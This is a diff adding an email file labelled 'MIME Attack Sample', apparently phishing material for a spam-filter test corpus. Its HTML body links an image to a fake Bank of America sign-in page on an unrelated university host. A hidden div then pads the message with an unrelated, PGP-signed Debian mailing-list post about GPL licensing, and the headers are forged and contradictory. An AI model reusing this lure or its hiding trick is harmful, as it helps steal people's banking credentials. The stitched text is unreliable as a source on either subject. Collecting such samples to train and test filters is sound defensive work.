@@ -1,0 +1,83 @@
+From: "Bill Vorias" <billv@loyaltybuilders.com>
+To: marlene.hilliard@enron.com, sylvia.campos@enron.com
+Subject: MIME Attack Sample
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <GLOBAL-8B72CDD2yEXU00000697@global-8b72cdd2>
+X-OriginalArrivalTime: 22 Jan 2007 04:40:08.0703 (UTC) FILETIME=[652148F0:01C73DDF]
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 655
+
+<body>
+<img src="http://subarukou.info/%7Ephoto/.1/1day05.gif" width="491" height="628" border="0" usemap="#indi"> 
+<MAP NAME="indi">
+  <AREA SHAPE="rect" COORDS="4,277,348,297" HREF="http://csdb.ngcsu.edu/fred/webonline/account_profile/bankofamerica/db/SignIn/">
+</MAP>
+Content-Type: text/html
+<div style="display: none;"><plaintext>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+On Mon, Jun 04, 2007 at 02:05:58PM -0300, cascardo@minaslivre.org wrote:
+> On Mon, Jun 04, 2007 at 09:51:11AM -0700, Walter Landry wrote:
+> > Terry Hancock <hancock@anansispaceworks.com> wrote:
+> > > IMHO, the license of the sequencing software you used is completely
+> > > irrelevant. You USE a toolchain when you create with it, you don't
+> > > DERIVE from it (the exception being things like libraries -- or
+> > > soundfonts -- that get incorporated into the resulting work).
+> > > 
+> > > So, the soundfont license needs to be very permissive, but I don't think
+> > > there should be any concern about the tool used to create it.
+> > 
+> > The license of the sequencing software does matter.  If the sequencing
+> > software is non-free, then the WAV files build-depend on a non-free
+> > component.  It is the same as if you used a non-free compiler to
+> > create an executable.  If the soundfonts are GPL compatible, that
+> > would put the WAV's in contrib.
+> > 
+> > Cheers,
+> > Walter Landry
+> > wlandry@ucsd.edu
+> > 
+> 
+> Although I would agree with that, the main matter here is not whether
+> this WAV file would be appropriate for main or contrib, but whether it
+> is distributable at all, since the GPLv2 requires complete source code,
+> which includes "the scripts used to control compilation and installation
+> of the executable".
+> 
+> Regards,
+> Thadeu Cascardo.
+> 
+> 
+
+In that case then I believe that the WAV would be undistributable, since
+the program used to create/compile it (Depending upon how you look at
+it) is undistributable under the GPL. So would that throw the WAV file
+in non-free?
+
+- -- 
+http://digital-haze.net/~pobega/ - My Website
+If programmers deserve to be rewarded for creating innovative
+programs, by the same token they deserve to be punished if they
+restrict the use of these programs. 
+ - Richard Stallman
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+iD8DBQFGZGrpg6qL2BGnx4QRApgZAKCWm45mP6TpbNSjINGPd6ILQGfOWQCeMi6D
+OhcA9WgZELU4/4Kr9FDD5SM=
+=r6St
+-----END PGP SIGNATURE-----
+
+
+-- 
